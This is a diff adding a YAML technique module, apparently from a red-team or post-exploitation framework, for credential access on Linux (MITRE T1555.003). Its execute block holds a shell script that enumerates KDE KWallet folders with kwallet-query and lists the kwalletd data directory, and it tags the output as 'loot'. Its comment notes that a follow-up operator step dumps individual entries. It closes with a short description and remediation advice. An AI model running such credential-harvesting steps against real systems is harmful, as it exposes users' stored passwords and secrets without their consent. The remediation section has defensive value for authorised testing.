@@ -1,0 +1,37 @@
+technique: T1555.003
+name: KDE KWallet dump via kwallet-query
+key: loot:kwallet
+tactic: [credential-access]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  facts_match: {has_kwallet: true}
+execute:
+  command: |-
+    # kwallet-query reads a given wallet; -l lists folders, -r reads a
+    # specific entry. We list and surface the folder names first; a
+    # follow-up operator step dumps individual entries.
+    if command -v kwallet-query >/dev/null 2>&1; then
+      kwallet-query -l 2>/dev/null | head -20
+      for wallet in kdewallet Passwords; do
+        kwallet-query -l "$wallet" 2>/dev/null | sed "s/^/$wallet: /"
+      done
+    fi
+    ls "$HOME/.local/share/kwalletd/" 2>/dev/null
+verify:
+  success: "wallet"
+cleanup:
+  command: ""
+report:
+  vector_type: kwallet_loot
+  evidence: "kwalletd running + kwallet-query reachable"
+  description: >
+    KWallet is KDE's keyring. Like gnome-keyring, once the user is in
+    their session the daemon unlocks the wallet and sibling processes
+    read every stored secret via ``kwallet-query`` without re-prompting.
+  remediation: >
+    Set the wallet to lock on screen-saver. Audit the kwalletd policy.
+  refs: [T1555.003]
